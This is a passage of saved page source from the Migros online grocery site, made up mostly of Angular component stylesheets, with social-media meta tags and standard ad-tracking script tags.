      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .list-page-items-container[_ngcontent-isc-c425] sm-list-page-item[_ngcontent-isc-c425] {
          margin-right: .5rem
        }
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .list-page-items-container[_ngcontent-isc-c425] {
          padding: 0 0 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .image-items-wrapper[_ngcontent-isc-c425] {
        display: flex;
        height: 22rem
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .image-items-wrapper[_ngcontent-isc-c425] .container-wrapper[_ngcontent-isc-c425] {
        position: relative;
        overflow-x: hidden;
        width: 100%
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .image-items-wrapper[_ngcontent-isc-c425] img[_ngcontent-isc-c425] {
        border-radius: 8px;
        margin-right: 1.5rem;
        cursor: pointer;
        max-width: 360px
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .image-items-wrapper[_ngcontent-isc-c425] img[_ngcontent-isc-c425] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .see-all-button[_ngcontent-isc-c425] {
        width: calc(100% - 2rem);
        margin-top: .75rem;
        height: 3.125rem;
        padding: 0 1rem;
        margin-left: 1rem
      }

      @media (min-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .see-all-button[_ngcontent-isc-c425] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .next-btn[_ngcontent-isc-c425] {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(50%, -50%);
        background-color: var(--basicColorWhite);
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        right: 0;
        top: 50%;
        position: absolute;
        z-index: 2;
        cursor: pointer
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .next-btn[_ngcontent-isc-c425] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .next-btn[_ngcontent-isc-c425]:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(45deg)
      }

      .home-page-wrapper[_ngcontent-isc-c425] .next-btn[_ngcontent-isc-c425]:after {
        left: .4em;
        position: relative;
        font-size: 2rem;
        top: 1rem
      }

      .home-page-wrapper[_ngcontent-isc-c425] .prev-btn[_ngcontent-isc-c425] {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(-50%, -50%);
        background-color: var(--basicColorWhite);
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        left: 0;
        top: 50%;
        position: absolute;
        z-index: 2;
        cursor: pointer;
        opacity: .4;
        transition: .2s ease-in-out
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .prev-btn[_ngcontent-isc-c425] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .prev-btn[_ngcontent-isc-c425]:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(225deg)
      }

      .home-page-wrapper[_ngcontent-isc-c425] .prev-btn[_ngcontent-isc-c425]:after {
        left: 1.15em;
        position: relative;
        font-size: 2rem;
        top: 1rem
      }

      [_nghost-isc-c425] sm-list-page-item {
        min-width: 10.25rem;
        max-width: 10.25rem
      }

      [_nghost-isc-c425] sm-list-page-item .mdc-card {
        border-radius: 8px
      }

      [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab-group {
        flex-direction: row !important
      }

      [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab-labels {
        flex-direction: column !important
      }

      [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab {
        justify-content: start;
        padding-left: 1rem;
        margin-bottom: 1rem;
        margin-right: 6rem
      }

      [_nghost-isc-c425] .shopping-tabs .mdc-tab--active .mdc-tab-indicator {
        position: absolute;
        left: 0;
        bottom: 0;
        top: 0 !important;
        width: .3rem;
        height: 100%;
        background-color: var(--brandColorPrimary700)
      }

      [_nghost-isc-c425] .shopping-tabs .mdc-tab--active .mdc-tab-indicator__content {
        opacity: 0
      }

      [_nghost-isc-c425] .shopping-tabs .mdc-tab__text-label {
        margin: 0
      }

      [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab-body-content {
        display: flex;
        gap: 1.5rem;
        overflow-y: scroll;
        scrollbar-width: none;
        -ms-overflow-style: none
      }

      [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab-body-content .container-wrapper .fade-out {
        top: 0 !important
      }

      [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab-body-content::-webkit-scrollbar {
        width: 0;
        height: 0
      }

      [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab-body-wrapper {
        width: 100%
      }

      @media (min-width: 768px) {
        [_nghost-isc-c425] .shopping-tabs .mat-mdc-tab-body-wrapper {
          margin-left: -3rem
        }
      }

      [_nghost-isc-c425] .invoice-form-button {
        position: relative !important;
        padding: 0 .5rem !important;
        height: auto !important
      }

      [_nghost-isc-c425] .invoice-form-button .invoice-form {
        display: flex
      }

      [_nghost-isc-c425] .invoice-form-button .invoice-form .icon-small-invoice-form {
        height: 1rem
      }

      [_nghost-isc-c425] .electronic-banner-shopping-list {
        margin-top: 1rem
      }

      @media (min-width: 768px) {
        [_nghost-isc-c425] .electronic-banner-shopping-list {
          display: flex;
          margin-bottom: -3rem
        }
      }

      [_nghost-isc-c425] .electronic-banner-shopping-list .electronic-banner-shopping-list-items {
        cursor: pointer;
        width: 100%;
        padding: 0 1rem;
        margin: .5rem 0;
        border-radius: .3125rem
      }

      @media (min-width: 768px) {
        [_nghost-isc-c425] .electronic-banner-shopping-list .electronic-banner-shopping-list-items {
          width: 32%;
          height: auto
        }
      }

      @media (min-width: 992px) {
        [_nghost-isc-c425] .electronic-banner-shopping-list .electronic-banner-shopping-list-items {
          padding: 0;
          margin: 0 1rem 0 0
        }
      }

      [_nghost-isc-c425] .fade-out {
        height: 100%
      }

      .elektronik[_nghost-isc-c425] .home-page-wrapper[_ngcontent-isc-c425],
      .elektronik [_nghost-isc-c425] .home-page-wrapper[_ngcontent-isc-c425] {
        margin-bottom: 5rem
      }

      .mion[_nghost-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425],
      .mion [_nghost-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425] {
        min-width: 7rem;
        min-height: 7rem;
        border: none;
        padding: 0
      }

      @media (max-width: 992px) {

        .mion[_nghost-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425],
        .mion [_nghost-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425] {
          min-width: unset;
          min-height: unset
        }
      }

      .mion[_nghost-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425] img[_ngcontent-isc-c425],
      .mion [_nghost-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425] img[_ngcontent-isc-c425] {
        max-height: initial
      }

      .mion[_nghost-isc-c425] .see-all-button[_ngcontent-isc-c425],
      .mion [_nghost-isc-c425] .see-all-button[_ngcontent-isc-c425] {
        border: 1px solid #141415 !important;
        font-weight: 600
      }
    </style>
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@migros_tr">
    <meta name="twitter:title" content="Migros">
    <meta name="twitter:description" content="">
    <meta name="twitter:image" content="https://images.migrosone.com/sanalmarket/custom/sanalmarket-seo-34706362.png">
    <meta name="twitter:price" content="null">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Migros">
    <meta property="og:price:amount" content="null">
    <meta property="og:url" content="https://www.migros.com.tr/teslimat-adresi">
    <link rel="canonical" href="https://www.migros.com.tr/teslimat-adresi">
    <script async="" src="https://tags.bluekai.com/site/83669?ret=js&amp;limit=1"></script>
    <style>
      .adjust-smart-banner__AEqYlWgPonspKfseFq2N {
        height: 76px
      }

      @media(min-width: 428px) {
        .adjust-smart-banner__AEqYlWgPonspKfseFq2N {
          height: 0
        }
      }

      .adjust-smart-banner__NVk5vwju_4kdaKzGWJPq {
        position: fixed;
        left: 0;
        right: 0;
        z-index: 10000000
      }

      .adjust-smart-banner__NVk5vwju_4kdaKzGWJPq.adjust-smart-banner__jOV7BvlxDT7ATfbLPh3j {
        top: 0
      }

      .adjust-smart-banner__NVk5vwju_4kdaKzGWJPq.adjust-smart-banner__XmomYv1VVQYz0lEtn9Q2 {
        bottom: 0
      }

      .adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK {
        margin: 0 auto;
        max-width: 428px;
        background: #fff
      }

      .adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI {
        display: flex;
        align-items: center;
        padding: 10px 8px 10px 4px
      }

      .adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI .adjust-smart-banner__VFuxsD_KzqNSxQecFmao {
        width: 32px;
        height: 32px;
        border: none;
        background: url("data:image/svg+xml;utf8,    
<svg xmlns=%27http: //www.w3.org/2000/svg%27 version=%271.1%27 preserveAspectRatio=%27none%27 viewBox=%270 0 16 16%27>
            <path d=%27M1 0 L0 1 L15 16 L16 15 L1 0%27 fill=%27%236e7492%27/> <path d=%27M16 1 L16 1 L1 16 L0 15 L15 0%27 fill=%27%236e7492%27/> </svg>");background-repeat:no-repeat;background-position:center center;background-size:8px 8px,auto;cursor:pointer}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI .adjust-smart-banner__hqvH8Y5fwbegVLKnoYv_{width:56px;height:56px;overflow:hidden;background-color:#6e7492;border-radius:8px}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI .adjust-smart-banner__hqvH8Y5fwbegVLKnoYv_ .adjust-smart-banner__Ll9XMTDiX4Drgeydp0Oc{display:flex;align-items:center;justify-content:center;width:100%;height:100%;color:#353a52;font-weight:bold;font-size:23px;font-family:ArialMt,Arial,sans-serif;line-height:32px;background-color:#e0e2ec}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI .adjust-smart-banner__hqvH8Y5fwbegVLKnoYv_ .adjust-smart-banner__VYRfEif2Ph2_984rXQy8{width:100%}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI .adjust-smart-banner__I8xX0C5dUcR53pY0aEys{flex:1 1 0%;min-height:0;min-width:0;margin:0 12px}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI .adjust-smart-banner__JJLdp2l7YvnsUXudojWA{overflow:hidden;text-overflow:ellipsis}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI h4{margin:5px 0 8px;color:#353a52;font-family:Arial-BoldMT,ArialMt,Arial,sans-serif;font-size:12px;font-weight:bold;line-height:16px;white-space:nowrap}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI p{margin:8px 0 7px;color:#353a52;font-family:ArialMt,Arial,sans-serif;font-size:9px;line-height:11px;max-height:22px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}.adjust-smart-banner__NVk5vwju_4kdaKzGWJPq .adjust-smart-banner__eXKzWnRDn4RWUiSSeVYK .adjust-smart-banner__r3JnN_RNhpzArrmKQ8jI .adjust-smart-banner__risKVvV3T0vjKiSTR9l0{color:#6e7492;background:#f9fafc;border:1px solid #cdd0e0;border-radius:4px;border-color:#6e7492;box-shadow:inset 0px -1px 0px 0px #e0e2ec;padding:4px 6.5px;display:inline-block;vertical-align:middle;text-align:center;font-family:ArialMt,Arial,sans-serif;font-size:12px;font-weight:500;line-height:16px;cursor:pointer;text-decoration:none}
    </style>
    <script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/715674769/?random=1709167790964&amp;cv=11&amp;fst=1709167790964&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be42q1v889281616z8811483837za201&amp;gcd=13n3n3l3l5&amp;dma=0&amp;u_w=1366&amp;u_h=768&amp;url=https%3A%2F%2Fwww.migros.com.tr%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Migros%20Sanal%20Market%3A%20Online%20Market%20Al%C4%B1%C5%9Fveri%C5%9Fi&amp;npa=0&amp;pscdl=noapi&amp;auid=37027196.1709149487&amp;uaa=x86&amp;uab=64&amp;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69&amp;uamb=0&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;rfmt=3&amp;fmt=4"></script>
    <style>
      .sm-how-to-wrapper[_ngcontent-isc-c420] {
        display: flex;
        margin: 2rem 0;
        justify-content: space-between
      }

      @media (max-width: 768px) {
        .sm-how-to-wrapper[_ngcontent-isc-c420] {
          display: grid;
          grid-template-columns: 1fr;
          place-items: center;
          gap: 1rem;
          margin: 1.5rem 0 5rem;
          padding: 0 1rem
        }
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] {
        display: flex;
        flex-direction: column;
        text-align: center;
        align-items: center;
        border: solid 1px var(--basicColor300);
        border-radius: 8px;
        padding: 2rem;
        margin: 0 1rem
      }

      @media (max-width: 768px) {
        .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] {
          width: 100%
        }
      }

      @media (min-width: 768px) {
        .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420]:first-child {
          margin-left: 0
        }

        .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420]:last-child {
          margin-right: 0
        }
      }

      @media (min-width: 768px) {
        .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] {
          padding: 1rem
        }
      }

      @media (min-width: 1200px) {
        .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] {
          padding: 2rem 3rem
        }
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to.hemen[_ngcontent-isc-c420] {
        padding: 3rem;
        margin: 0 2rem
      }

      @media (min-width: 768px) {
        .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to.hemen[_ngcontent-isc-c420]:first-child {
          margin-left: 0
        }

        .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to.hemen[_ngcontent-isc-c420]:last-child {
          margin-right: 0
        }
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image[_ngcontent-isc-c420] {
        width: 7.5rem;
        height: 7.5rem;
        background-repeat: no-repeat;
        background-size: contain
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image.card[_ngcontent-isc-c420] {
        background-image: url(assets/home-page/card.png)
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image.truck[_ngcontent-isc-c420] {
        background-image: url(assets/home-page/truck.png)
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image.box[_ngcontent-isc-c420] {
        background-image: url(assets/home-page/box.png)
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image.money[_ngcontent-isc-c420] {
        background-image: url(assets/home-page/money-logo.png)
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image.motorcycle[_ngcontent-isc-c420] {
        background-image: url(assets/home-page/motorcycle.webp)
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image.shopping-bag[_ngcontent-isc-c420] {
        background-image: url(assets/home-page/shopping-bag.webp)
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .image.migros-hemen-logo[_ngcontent-isc-c420] {
        background-image: url(assets/home-page/migros-hemen-logo.webp)
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .text[_ngcontent-isc-c420] {
        margin: 1rem 0 .75rem;
        max-width: 10rem
      }

      .sm-how-to-wrapper[_ngcontent-isc-c420] .how-to[_ngcontent-isc-c420] .detail[_ngcontent-isc-c420] {
        max-width: 15rem
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      sm-swiper-banner {
        --swiper-theme-color: var(--brandColorPrimary700);
        display: block;
        margin-top: 1rem
      }

      @media (min-width: 768px) {
        sm-swiper-banner {
          margin-top: 2rem
        }
      }

      sm-swiper-banner a {
        cursor: pointer
      }

      sm-swiper-banner .swiper-button-disabled {
        pointer-events: auto !important
      }

      sm-swiper-banner .swiper-wrapper {
        align-items: stretch
      }

      sm-swiper-banner .swiper-slide {
        height: auto
      }

      sm-swiper-banner .swiper-placeholder {
        margin-top: -21px
      }

      sm-swiper-banner .swiper-lazy-preloader {
        margin-left: -7px;
        margin-top: -7px;
        width: 14px;
        height: 14px;
        top: 70%
      }

      @media (min-width: 576px) {
        sm-swiper-banner .swiper-lazy-preloader {
          width: 42px;
          height: 42px;
          margin-left: -21px;
          margin-top: -21px
        }
      }

      sm-swiper-banner .swiper-button-next {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(50%, -50%);
        padding-right: 20px;
        background-color: var(--basicColorWhite);
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        opacity: 1;
        color: var(--basicColorBlack);
        right: 0;
        margin: 0;
        top: 50%
      }

      @media (max-width: 576px) {
        sm-swiper-banner .swiper-button-next {
          transform: translate(50%, -50%) scale(.75)
        }
      }

      sm-swiper-banner .swiper-button-next:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(45deg)
      }

      sm-swiper-banner .swiper-button-next:after {
        left: -.05em;
        position: relative
      }

      sm-swiper-banner .swiper-button-prev {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(-50%, -50%);
        padding-left: 20px;
        background-color: var(--basicColorWhite);
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        opacity: 1;
        color: var(--basicColorBlack);
        left: 0;
        top: 50%;
        margin: 0
      }

      @media (max-width: 576px) {
        sm-swiper-banner .swiper-button-prev {
          transform: translate(-50%, -50%) scale(.75)
        }
      }

      sm-swiper-banner .swiper-button-prev:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(225deg)
      }

      sm-swiper-banner .swiper-button-prev:after {
        left: .08em;
        position: relative
      }

      sm-swiper-banner .swiper-pagination.swiper-pagination-bullets {
        bottom: 0
      }

      sm-swiper-banner .swiper-pagination .swiper-pagination-bullet {
        width: .625rem;
        height: .25rem;
        border-radius: 1px;
        background: var(--basicColor800)
      }

      @media (max-width: 576px) {
        sm-swiper-banner .swiper-pagination .swiper-pagination-bullet {
          width: .375rem
        }
      }

      sm-swiper-banner .swiper-pagination .swiper-pagination-bullet-active {
        height: .375rem;
        background: var(--brandColorPrimary700)
      }

      sm-swiper-banner img {
        width: 100%;
        height: auto;
        border-radius: 5px
      }

      sm-swiper-banner .swiper-container {
        padding-bottom: .5rem
      }

      @media (max-width: 576px) {
        sm-swiper-banner .swiper-container {
          padding-bottom: 1rem
        }
      }

      sm-swiper-banner .home-slider-banner {
        transform-origin: 0 0
      }

      #sm-home-main-swiper-banner,
      #sm-home-main-top-banner {
        margin-top: 1rem
      }

      #sm-home-main-top-banner .swiper-container {
        padding-bottom: 0
      }

      #sm-home-main-top-banner .swiper-container a {
        display: flex
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .fast-cart-banner[_ngcontent-isc-c383] {
        height: 8.125rem;
        padding: 1.75rem;
        border-radius: 8px;
        background-color: #fff1e3;
        display: flex;
        align-items: center
      }

      @media (max-width: 768px) {
        .fast-cart-banner[_ngcontent-isc-c383] {
          height: 15rem;
          flex-direction: column;
          text-align: center;
          padding: 1rem;
          justify-content: space-between
        }
      }

      .fast-cart-banner[_ngcontent-isc-c383] .banner-icon[_ngcontent-isc-c383] {
        width: 3.125rem
      }

      @media (max-width: 768px) {
        .fast-cart-banner[_ngcontent-isc-c383] .banner-icon[_ngcontent-isc-c383] {
          width: 2.25rem
        }
      }

      .fast-cart-banner__title[_ngcontent-isc-c383] {
        margin-left: 1rem
      }

      .fast-cart-banner__title[_ngcontent-isc-c383] [_ngcontent-isc-c383]:first-child {
        font-size: 1.5rem;
        font-weight: 600
      }

      @media (max-width: 768px) {
        .fast-cart-banner__title[_ngcontent-isc-c383] [_ngcontent-isc-c383]:first-child {
          font-size: 1.125rem
        }
      }

      @media (max-width: 768px) {
        .fast-cart-banner__title[_ngcontent-isc-c383] [_ngcontent-isc-c383]:nth-child(2) {
          font-size: .75rem
        }
      }

      .fast-cart-banner__products[_ngcontent-isc-c383] {
        display: flex;
        align-items: center;
        margin-left: auto
      }

      @media (max-width: 768px) {
        .fast-cart-banner__products[_ngcontent-isc-c383] {
          margin: 0
        }
      }

      .fast-cart-banner__products[_ngcontent-isc-c383] img[_ngcontent-isc-c383] {
        width: 4rem;
        height: 4rem;
        border-radius: 12px;
        margin-right: .5rem
      }

      @media (max-width: 768px) {
        .fast-cart-banner__products[_ngcontent-isc-c383] img[_ngcontent-isc-c383] {
          width: 2.875rem;
          height: 2.875rem
        }
      }

      .fast-cart-banner__products[_ngcontent-isc-c383] .more-products[_ngcontent-isc-c383] {
        color: var(--basicColor700)
      }

      @media (min-width: 768px) {
        .fast-cart-banner__products[_ngcontent-isc-c383] .more-products[_ngcontent-isc-c383] {
          margin-left: .5rem
        }
      }

      .fast-cart-banner__button[_ngcontent-isc-c383] {
        font-size: 14px
      }

      @media (min-width: 768px) {
        .fast-cart-banner__button[_ngcontent-isc-c383] {
          margin-left: 2rem
        }
      }

      @media (max-width: 576px) {
        .fast-cart-banner__button[_ngcontent-isc-c383] {
          width: 100%
        }
      }
    </style>
    <style>
      sm-popup-banner .callout {
        position: fixed;
        bottom: 2.25rem;
        right: 1.25rem;
        width: 13rem;
        height: 13rem;
        background: #ccc;
        z-index: 99;
        border-radius: 1rem
      }

      @media (max-width: 768px) {
        sm-popup-banner .callout {
          margin: auto;
          inset: 0
        }
      }

      sm-popup-banner .callout .swiper-container {
        padding-bottom: 0
      }

      sm-popup-banner .callout sm-swiper-banner {
        margin-top: 0
      }

      sm-popup-banner .callout img {
        width: 100%;
        height: auto;
        border-radius: 1rem
      }

      sm-popup-banner fa-icon {
        position: absolute;
        top: .3rem;
        right: 1rem;
        color: #fff;
        font-size: 2rem;
        cursor: pointer;
        z-index: 100
      }

      sm-popup-banner fa-icon:hover {
        color: #d3d3d3
      }
    </style>
    <style>
      swiper {
        display: block;
      }
    </style>
    <style>
      .mdc-tab {
        min-width: 90px;
        padding-right: 24px;
        padding-left: 24px;
        display: flex;
        flex: 1 0 auto;
        justify-content: center;
        box-sizing: border-box;
        margin: 0;
        padding-top: 0;
        padding-bottom: 0;
        border: none;
        outline: none;
        text-align: center;
        white-space: nowrap;
        cursor: pointer;
        -webkit-appearance: none;
        z-index: 1
      }

      .mdc-tab::-moz-focus-inner {
        padding: 0;
        border: 0
      }

      .mdc-tab--min-width {
        flex: 0 1 auto
      }

      .mdc-tab__content {
        display: flex;
        align-items: center;
        justify-content: center;
        height: inherit;
        pointer-events: none
      }

      .mdc-tab__text-label {
        transition: 150ms color linear;
        display: inline-block;
        line-height: 1;
        z-index: 2
      }

      .mdc-tab__icon {
        transition: 150ms color linear;
        z-index: 2
      }

      .mdc-tab--stacked .mdc-tab__content {
        flex-direction: column;
        align-items: center;
        justify-content: center
      }

      .mdc-tab--stacked .mdc-tab__text-label {
        padding-top: 6px;
        padding-bottom: 4px
      }

      .mdc-tab--active .mdc-tab__text-label,
      .mdc-tab--active .mdc-tab__icon {
        transition-delay: 100ms
      }

      .mdc-tab:not(.mdc-tab--stacked) .mdc-tab__icon+.mdc-tab__text-label {
        padding-left: 8px;
        padding-right: 0
      }

      [dir=rtl] .mdc-tab:not(.mdc-tab--stacked) .mdc-tab__icon+.mdc-tab__text-label,
      .mdc-tab:not(.mdc-tab--stacked) .mdc-tab__icon+.mdc-tab__text-label[dir=rtl] {
        padding-left: 0;
        padding-right: 8px
      }

      .mdc-tab-indicator .mdc-tab-indicator__content--underline {
        border-top-width: 2px
      }

      .mdc-tab-indicator .mdc-tab-indicator__content--icon {
        height: 34px;
        font-size: 34px
      }

      .mdc-tab-indicator {
        display: flex;
        position: absolute;
        top: 0;
        left: 0;
        justify-content: center;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1
      }

      .mdc-tab-indicator__content {
        transform-origin: left;
        opacity: 0
      }

      .mdc-tab-indicator__content--underline {
        align-self: flex-end;
        box-sizing: border-box;
        width: 100%;
        border-top-style: solid
      }

      .mdc-tab-indicator__content--icon {
        align-self: center;
        margin: 0 auto
      }

      .mdc-tab-indicator--active .mdc-tab-indicator__content {
        opacity: 1
      }

      .mdc-tab-indicator .mdc-tab-indicator__content {
        transition: 250ms transform cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mdc-tab-indicator--no-transition .mdc-tab-indicator__content {
        transition: none
      }

      .mdc-tab-indicator--fade .mdc-tab-indicator__content {
        transition: 150ms opacity linear
      }

      .mdc-tab-indicator--active.mdc-tab-indicator--fade .mdc-tab-indicator__content {
        transition-delay: 100ms
      }

      .mat-mdc-tab-ripple {
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        pointer-events: none
      }

      .mat-mdc-tab.mdc-tab {
        height: 48px;
        flex-grow: 0
      }

      .mat-mdc-tab .mdc-tab__ripple::before {
        content: "";
        display: block;
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        opacity: 0;
        pointer-events: none
      }

      .mat-mdc-tab .mdc-tab__content {
        position: relative
      }

      .mat-mdc-tab:hover .mdc-tab__ripple::before {
        opacity: .04
      }

      .mat-mdc-tab.cdk-program-focused .mdc-tab__ripple::before,
      .mat-mdc-tab.cdk-keyboard-focused .mdc-tab__ripple::before {
        opacity: .12
      }

      .mat-mdc-tab .mat-ripple-element {
        opacity: .12
      }

      .mat-mdc-tab-group.mat-mdc-tab-group-stretch-tabs>.mat-mdc-tab-header .mat-mdc-tab {
        flex-grow: 1
      }

      .mat-mdc-tab-disabled {
        opacity: .4;
        pointer-events: none
      }

      .mat-mdc-tab-group {
        display: flex;
        flex-direction: column;
        max-width: 100%
      }

      .mat-mdc-tab-group.mat-mdc-tab-group-inverted-header {
        flex-direction: column-reverse
      }

      .mat-mdc-tab-group.mat-mdc-tab-group-inverted-header .mdc-tab-indicator__content--underline {
        align-self: flex-start
      }

      .mat-mdc-tab-body-wrapper {
        position: relative;
        overflow: hidden;
        display: flex;
        transition: height 500ms cubic-bezier(0.35, 0, 0.25, 1)
      }

      .mat-mdc-tab-body-wrapper._mat-animation-noopable {
        transition: none !important;
        animation: none !important
      }
    </style>
    <style>
      .mat-mdc-tab-header {
        display: flex;
        overflow: hidden;
        position: relative;
        flex-shrink: 0
      }

      .mat-mdc-tab-header-pagination {
        -webkit-user-select: none;
        user-select: none;
        position: relative;
        display: none;
        justify-content: center;
        align-items: center;
        min-width: 32px;
        cursor: pointer;
        z-index: 2;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        touch-action: none;
        box-sizing: content-box;
        background: none;
        border: none;
        outline: 0;
        padding: 0
      }

      .mat-mdc-tab-header-pagination::-moz-focus-inner {
        border: 0
      }

      .mat-mdc-tab-header-pagination .mat-ripple-element {
        opacity: .12
      }

      .mat-mdc-tab-header-pagination-controls-enabled .mat-mdc-tab-header-pagination {
        display: flex
      }

      .mat-mdc-tab-header-pagination-before,
      .mat-mdc-tab-header-rtl .mat-mdc-tab-header-pagination-after {
        padding-left: 4px
      }

